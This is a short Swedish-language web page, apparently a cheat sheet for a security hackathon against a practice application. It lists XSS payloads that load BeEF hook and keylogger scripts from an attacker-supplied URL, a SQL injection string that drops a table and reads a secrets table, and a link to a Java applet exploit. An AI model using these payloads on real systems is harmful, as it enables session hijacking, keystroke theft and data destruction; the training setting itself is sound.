<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head>
    <meta name="layout" content="main"/>
    <title>LeanOn - Hackaton</title>
</head>
<body>

<h1>LeanOn Hackaton - Cheat sheet</h1>


<h3>XSS - Beef javascript explotation framework</h3>
<p>
    Pudelns kärna! Omfattande verktyg som måste testas!
    Krav är dock att du har ruby 1.9.x installerat!
<p>
    <a href="http://beefproject.com/">Beef javascript exploitation framework</a>
</p>

<p>
    Exkvera hos offret för att få en "hook" (ligger i beef installationen)
    <br>
    <code>
        <%="""<img src=1 onerror=\$.getScript('[din url]/hook.js') height=0 width=0 />""".encodeAsHTML()%>
    </code>
</p>
<p>
    Exekvera hos offret för att få en "keylogger" (ligger i beef installationen)
    <br>
    <code>
        <%= """<img src=1 onerror=\$.getScript('[din url]/keylogger.js') height=0 width=0 />""".encodeAsHTML()%>
    </code>
</p>

</p>

<h3>SQL injection</h3>
<p>
    Du kan trixa med parametern <i>lambname</i> i /iLamb/myForum/index?lambname=Jonas
ex. <code>Jonas';drop%20table%20forum_post;select%20*%20from%20my_secrets%20where%20'1'%20%20=%20'1</code>
</p>
<h3>Java Applet exploit</h3>
<p>
    Skapa en java applet som du får offret att klicka på.
    <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/exploits/CVE-2012-4681/Exploit.java">Ex kod</a>
</p>
<h3>Blandat</h3>
<p>
<p><a href="https://addons.mozilla.org/sv-se/firefox/addon/tamper-data/eula/79565?src=dp-btn-primary">Skippa clientside validering</a></p>
<p><a href="http://thejh.net/misc/website-terminal-copy-paste">Copy paste trick ;)</a></p>
</p>


</body>
</html>